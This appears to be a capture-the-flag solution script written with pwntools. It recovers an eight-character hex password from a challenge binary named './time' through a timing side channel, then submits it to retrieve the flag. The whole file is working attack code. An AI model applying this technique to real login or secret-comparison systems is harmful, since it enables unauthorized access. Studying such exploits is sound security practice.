#!/usr/bin/env python3

from pwn import *
import subprocess
import time

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./time"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================

chars = b'0123456789abcdef'

char_array = b""
for i in range(0,8):
    print("\nTesting position ", 8-i)
    max_delay = 0
    found_char = b""
    for char in chars:
        io = start()
        print("Testing char ", chr(char))
        payload = b"x" * (7-i)  + chr(char).encode() + char_array
        print("Payload: ", payload)
        io.sendlineafter(b"Your guess: \n", payload)


        start_time = time.time()
        response = io.recvall(timeout=2)
        elapsed = time.time() - start_time
        print(f"Response time: {elapsed:.2f} seconds\n")
        if elapsed > max_delay:
            max_delay = elapsed
            found_char = chr(char).encode()
        io.close()
    print("Character identified: ",found_char)
    char_array = (found_char) + char_array

print("Found password: ", char_array)

print("Getting flag:")
io = start()
io.sendlineafter(b"Your guess: \n", char_array)
print(io.recvall().decode())




